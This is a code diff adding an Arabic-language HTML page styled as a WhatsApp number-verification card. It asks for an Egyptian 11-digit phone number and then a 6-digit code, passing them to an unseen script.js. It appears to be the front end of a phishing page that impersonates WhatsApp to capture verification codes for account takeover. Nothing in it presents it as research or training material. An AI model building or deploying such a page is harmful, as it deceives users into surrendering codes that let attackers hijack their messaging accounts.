@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Untitled</title>
+    <link rel="stylesheet" href="./style.css">
+
+  </head>
+    
+  <body>
+  <div class="whatsapp-card">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+        <h3>التحقق من رقمك</h3>
+    </div>
+    
+    <form id="loginForm">
+        <div id="step1">
+            <p>أدخل رقم هاتفك المكون من 11 رقم (يبدأ بـ 01)</p>
+            <input type="tel" id="phone" placeholder="01XXXXXXXXX" maxlength="11">
+            <button type="button" class="btn-next" onclick="nextStep()">التالي</button>
+        </div>
+
+        <div id="step2" style="display: none;">
+            <p>أدخل الكود المكون من 6 أرقام</p>
+            <input type="text" id="code" placeholder="- - - - - -" maxlength="6">
+            <button type="submit" id="submitBtn" class="btn-next">تم</button>
+        </div>
+    </form>
+</div>
+    <script  src="./script.js"></script>
+
+  </body>
+  
+</html>
